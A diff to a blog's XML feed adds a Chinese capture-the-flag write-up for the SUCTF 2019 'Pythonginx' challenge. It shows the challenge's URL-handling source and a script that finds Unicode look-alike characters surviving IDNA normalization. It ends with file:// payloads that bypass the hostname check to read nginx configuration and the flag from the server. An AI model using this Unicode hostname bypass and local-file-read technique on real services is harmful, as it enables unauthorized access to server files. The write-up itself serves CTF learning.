@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题043</title>
+    <link href="/2021/03/03/BUU043/"/>
+    <url>/2021/03/03/BUU043/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[SUCTF 2019]Pythonginx<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a959acc0f70a10c6.png">   </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了源码：     </p><pre><code>        @app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &#39;suctf.cc&#39;:        return &quot;我扌 your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &#39;suctf.cc&#39;:        return &quot;我扌 your problem? 222 &quot; + host    newhost = []    for h in host.split(&#39;.&#39;):        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))    parts[1] = &#39;.&#39;.join(newhost)    #去掉 url 中的空格    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &#39;suctf.cc&#39;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;     </code></pre><p>前两个if不能等于<code>suctf.cc</code>，第三个if读取文件—-&gt;<code>file</code>协议<br>第三个if要<code>host == &#39;suctf.cc&#39;</code><br>不过第三个前面还有个decode<br>所以对输入的加密即可      </p><p>偷大佬的脚本：       </p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():    for x in range(65536):        uni=chr(x)        url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)        try:            if getUrl(url):                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])        except:            passdef getUrl(url):    url = url    host = parse.urlparse(url).hostname    if host == &#39;suctf.cc&#39;:        return False    parts = list(urlsplit(url))    host = parts[1]    if host == &#39;suctf.cc&#39;:        return False    newhost = []    for h in host.split(&#39;.&#39;):        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))    parts[1] = &#39;.&#39;.join(newhost)    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &#39;suctf.cc&#39;:        return True    else:        return Falseif __name__==&quot;__main__&quot;:    get_unicode()       //运行结果      str: ℂ unicode: \u2102str: ℭ unicode: \u212dstr: Ⅽ unicode: \u216dstr: ⅽ unicode: \u217dstr: Ⓒ unicode: \u24b8str: ⓒ unicode: \u24d2str: Ｃ unicode: \uff23str: ｃ unicode: \uff43</code></pre><p>把最后一个c替换即可<br>题目提示nginx，读取nginx的文件         </p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf     </code></pre><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?url=file://suctf.cⅭ/usr/local/nginx/conf/nginx.conf</code><br>然后读取flag<br>payload:<code>?url=file://suctf.cⅭ/usr/fffffflag</code>     </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题042</title>
     <link href="/2021/03/02/BUU042/"/>
     <url>/2021/03/02/BUU042/</url>
